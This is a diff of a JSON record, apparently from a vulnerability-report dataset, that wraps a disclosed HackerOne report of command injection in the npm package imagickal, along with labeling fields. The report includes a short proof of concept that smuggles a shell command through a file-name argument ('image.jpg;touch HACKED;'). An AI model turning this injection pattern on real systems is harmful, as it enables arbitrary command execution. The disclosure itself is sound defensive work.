@@ -1,45 +1,45 @@
 {
-    "reported_to": "Node.js third-party modules",
-    "reported_by": "solov9ev ",
-    "title": "[imagickal] Remote Code Execution",
-    "content": "\nI would like to report RCE in imagickal\nIt allows to execute arbitrary commands on the victim's PC\nModule\nmodule name: imagickal\nversion: 4.2.0\nnpm page: https://www.npmjs.com/package/imagickal\nModule Description\nnode wrapper for ImageMagick commands\nModule Stats\n[42] weekly downloads\nVulnerability\nVulnerability Description\nCode injection while processing a photo\nSteps To Reproduce:\nRun npm i imagickal\nCreate and run the following POC index.js:\nCode 118 Bytes\n1var im = require('imagickal');\n2\n3im.identify('image.jpg;touch HACKED;').then(function (data) {\n4  console.log(data);\n5});\nThe exploit worked and created the file - HACKED\nPatch\nCheck input before command\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nCommand Injection on imagickal module via insecure command\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "solov9ev ",
+  "title": "[imagickal] Remote Code Execution",
+  "content": "\nI would like to report RCE in imagickal\nIt allows to execute arbitrary commands on the victim's PC\nModule\nmodule name: imagickal\nversion: 4.2.0\nnpm page: https://www.npmjs.com/package/imagickal\nModule Description\nnode wrapper for ImageMagick commands\nModule Stats\n[42] weekly downloads\nVulnerability\nVulnerability Description\nCode injection while processing a photo\nSteps To Reproduce:\nRun npm i imagickal\nCreate and run the following POC index.js:\nCode 118 Bytes\n1var im = require('imagickal');\n2\n3im.identify('image.jpg;touch HACKED;').then(function (data) {\n4  console.log(data);\n5});\nThe exploit worked and created the file - HACKED\nPatch\nCheck input before command\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nCommand Injection on imagickal module via insecure command\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1610631540,
+  "report_url": "https://hackerone.com/reports/973245",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Run npm i imagickal"
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Code Injection"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1610631540,
-    "report_url": "https://hackerone.com/reports/973245",
-    "is_multi_component": false,
-    "complexity": "LOW",
-    "novelty": "MEDIUM",
-    "vuln_category": "CODE",
-    "steps": [
-        [
-            1,
-            "Run npm i imagickal"
-        ],
-        [
-            2,
-            "Create and run the following POC index.js: var im = require('imagickal'); im.identify('image.jpg;touch HACKED;').then(function (data) { console.log(data); });"
-        ]
-    ],
-    "vuln_description": "The imagickal module is vulnerable to command injection via insecure processing of user-supplied input in the identify function, allowing arbitrary command execution.",
-    "reason": "The vulnerability is straightforward to discover as it involves a common command injection pattern where user input is directly passed to a system command without proper sanitization. The attack does not require complex interactions or state manipulation.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "injection_metadata": {
-        "is_simple_payload": true
-    },
-    "authnz_metadata": {
-        "reason": "The vulnerability involves command injection in the imagickal module, which is not related to authentication or authorization boundaries. The proposed methodologies focus on testing AuthN/AuthZ and IDOR vulnerabilities by manipulating user sessions and resource access, not command injection vulnerabilities.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Create and run the following POC index.js: var im = require('imagickal'); im.identify('image.jpg;touch HACKED;').then(function (data) { console.log(data); });"
+    ]
+  ],
+  "vuln_description": "The imagickal module is vulnerable to command injection via insecure processing of user-supplied input in the identify function, allowing arbitrary command execution.",
+  "reason": "The vulnerability is straightforward to discover as it involves a common command injection pattern where user input is directly passed to a system command without proper sanitization. The attack does not require complex interactions or state manipulation.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection in the 'imagickal' module, which is not related to authentication or authorization (AuthN/AuthZ) issues. The described methodology focuses on detecting AuthN/AuthZ vulnerabilities by testing user sessions and resource access patterns, not command injection vulnerabilities.",
+    "is_detectable": false
+  }
 }
